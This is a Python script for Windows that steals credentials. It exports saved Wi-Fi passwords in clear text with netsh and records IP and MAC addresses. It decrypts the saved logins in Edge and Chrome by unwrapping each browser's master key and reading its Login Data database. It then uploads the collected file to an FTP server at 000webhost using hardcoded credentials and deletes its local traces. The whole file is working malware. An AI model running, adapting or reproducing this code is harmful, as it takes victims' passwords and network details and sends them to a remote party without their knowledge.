import subprocess
import time
import xml.etree.ElementTree as ET
import os
import json
import base64
import shutil
import ftplib
import sqlite3
import win32crypt
from Crypto.Cipher import AES



current_dir = "cd"
response = subprocess.run(current_dir, capture_output=True, text=True, shell=True)
response = response.stdout.replace("\n", "")
x = response.split("\\")
name = x[2]

f_h = open(f"{name}.txt", 'a', encoding='utf-8')

# IPCONFIG
command = "ipconfig/all"
result = subprocess.run(command, capture_output=True, text=True, shell=True)
result = result.stdout
x = result.split('\n\n')
dict = {}
adp = []  # Ip and MAC
for i in range(0, len(x), 2):
    dict[x[i]] = x[i + 1]
for i in dict:
    if i == 'Wireless LAN adapter Wi-Fi:':
        z = dict[i].split("\n")
        for i in z:
            if "Physical Address" in i or "IPv4 Address" in i:
                ax = i.split(":")
                adp.append(ax[0].replace(". ", '').lstrip() + ":" + ax[1])
            if "Physical Address" in i:
                ax = i.split(":")
                mac = ax[1]

if name == "Admin" or name == "Administrator":
    name = name + mac

# WIFI PASS
exp_c = f"netsh wlan export profile key=clear folder={response}"
pwds = subprocess.run(exp_c, capture_output=True, text=True, shell=True)

f_names = os.listdir(response)
W_names = []

for i in f_names:
    if 'Wi-Fi' == i[:5]:
        W_names.append(i)
        
def fetch(xml_file):
    handle = ET.parse(xml_file)
    root_el = handle.getroot()
    ns = {'ns': 'http://www.microsoft.com/networking/WLAN/profile/v1'}
    name = root_el.find('ns:name', ns).text
    key = root_el.find('.//ns:keyMaterial', ns)

    if key is None:
        return ' '
    else:
        key_material = key.text
        return name + ' : ' + key_material + '\n\n'

f_h.write("\nIp and MAC\n")
for i in adp:
    f_h.write(i + "\n\n")

f_h.write("\nWi-Fi Passwords\n")
for i in W_names:
    values = fetch(i)
    f_h.write(values)
    



dec = []
key_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')


def find_key_edge():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key_edge = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key_edge = master_key_edge[5:]
        master_key_edge = win32crypt.CryptUnprotectData(master_key_edge, None, None, None, 0)[1]
        return master_key_edge
    except Exception as e:
        print(f"Error in find_key_edge: {e}")
        return None


def find_key_chrome():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r",
                encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key_c = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key_c = master_key_c[5:]
            master_key_c = win32crypt.CryptUnprotectData(master_key_c, None, None, None, 0)[1]
            return master_key_c
    except Exception as e:
        print(f"Error in find_key_chrome: {e}")
        return None


def decrypt_password_edge(raw_data, master_key_edge):
    try:
        iv = raw_data[3:15]
        payload = raw_data[15:]
        cipher = generate_cipher(master_key_edge, iv)
        decrypted_pass_edge = decrypt_payload(cipher, payload)
        decrypted_pass_edge = decrypted_pass_edge[:-16].decode()
        return decrypted_pass_edge
    except Exception as e:
        print(f"Error in decrypt_password_edge: {e}")
        return None


def decrypt_password_chrome(raw_data, master_key_c):
    try:
        iv = raw_data[3:15]
        payload = raw_data[15:]
        cipher = generate_cipher(master_key_c, iv)
        decrypted_pass_c = decrypt_payload(cipher, payload)
        decrypted_pass_c = decrypted_pass_c[:-16].decode()
        return decrypted_pass_c
    except Exception as e:
        print(f"Error in decrypt_password_chrome: {e}")
        return None



def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)







if __name__ == '__main__':
    
    master_key_edge = find_key_edge()
    if master_key_edge:
        login_path_e = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\default\\Login Data')
        try:
            shutil.copy2(login_path_e , "login_datae.db")
            con = sqlite3.connect("login_datae.db")
            cursor = con.cursor()

            statement = 'SELECT origin_url, username_value, password_value FROM logins'
            cursor.execute(statement)
            data = cursor.fetchall()

            for i in data:
                url = i[0]
                username = i[1]
                encr_pass = i[2]
                decrypt_password_e = decrypt_password_edge(encr_pass, master_key_edge)
                dec.append(url + "\n" + username + ":" + decrypt_password_e + "\n\n")

            cursor.close()
            con.close()

            for i in dec:
                f_h.write(i)
                
        except Exception as e:
            print(f"Error in retrieving Edge passwords: {e}")
            
            
            
            

    master_key_c = find_key_chrome()
    login_path_c = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data')
    try:
        shutil.copy2(login_path_c, "login_datac.db")
        con2 = sqlite3.connect("login_datac.db")
        cursor2 = con2.cursor()
        statement = 'SELECT origin_url, username_value, password_value FROM logins'
        cursor2.execute(statement)    
        data = cursor2.fetchall()
            
        for i in data:
            url = i[0]
            username = i[1]
            encr_pass = i[2]
            decrypt_pass2 = decrypt_password_chrome(encr_pass, master_key_c)
            dec.append(url + "\n" + username + ":" + decrypt_pass2 + "\n\n")

        cursor2.close()
        con2.close()
        
        for i in dec:
            f_h.write(i)
            
    except Exception as e:
        print(f"Error in retrieving Chrome passwords: {e}")
        



    try:
        master_key_c = find_key_chrome()
        login_path_c = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data')
        shutil.copy2(login_path_c, "login_datac.db")
        con2 = sqlite3.connect("login_datac.db")
        cursor2 = con2.cursor()
        statement = 'SELECT origin_url, username_value, password_value FROM logins'
        cursor2.execute(statement)    
        data = cursor2.fetchall()
        for i in data:
            url = i[0]
            username = i[1]
            encr_pass = i[2]
            decrypt_pass2 = decrypt_password_chrome(encr_pass, master_key_c)
            dec.append(url + "\n" + username + ":" + decrypt_pass2 + "\n\n")

        cursor2.close()
        con2.close()

        for i in dec:
            f_h.write(i)
    except:
        pass

       
    for i in W_names:
            os.remove(i)

    f_h.close()

    os.remove("login_datae.db")
    os.remove("login_datac.db")
        
    ftp = ftplib.FTP("files.000webhost.com")
    ftp.login("unbent-seesaw", "Chirag2311.")

    ftp.storbinary(f"STOR Files/{name}.txt", open(f"{name}.txt", "rb"))
    ftp.quit()


    f_h.close()
    os.remove(f"{name}.txt")

    
